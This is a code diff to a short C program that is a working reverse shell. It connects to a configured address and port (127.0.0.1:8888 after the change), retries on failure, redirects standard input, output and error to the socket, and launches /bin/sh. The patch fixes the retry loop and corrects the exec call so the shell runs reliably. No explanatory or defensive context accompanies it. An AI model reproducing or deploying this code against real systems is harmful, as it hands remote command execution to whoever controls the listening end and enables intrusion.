@@ -7,10 +7,9 @@
 #include <string.h>
 #include <unistd.h>
 
-#define PORT "3490"
-#define IP "127.0.0.1"
+#define PORT "8888"
 #define TIMEOUT 2
-
+#define IP "127.0.0.1"
 
 int main(void){
     
@@ -20,7 +19,7 @@ int main(void){
     memset(&hints, 0, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
-    
+
     int status;
     if((status = getaddrinfo(IP, PORT, &hints, &servinfo) != 0)){
         
@@ -39,13 +38,14 @@ int main(void){
                 perror("socket");
                 continue; 
             }
+            
             if(connect(sockfd, p->ai_addr, p->ai_addrlen) == -1){
                 
                 close(sockfd);
                 perror("connect");
                 continue;
             }
-
+            
             break;
         }
 
@@ -55,12 +55,15 @@ int main(void){
             if(i==4) return 2;
             sleep(TIMEOUT);
             continue;
+        }else {
+            break;
         }
     }
-    
+
     dup2(sockfd, 0);
     dup2(sockfd, 1);
     dup2(sockfd, 2);
-
-    execve("/bin/sh", NULL, NULL);
+    
+    char *args[] = {"/bin/sh", NULL};
+    execv("/bin/sh", args);
 }
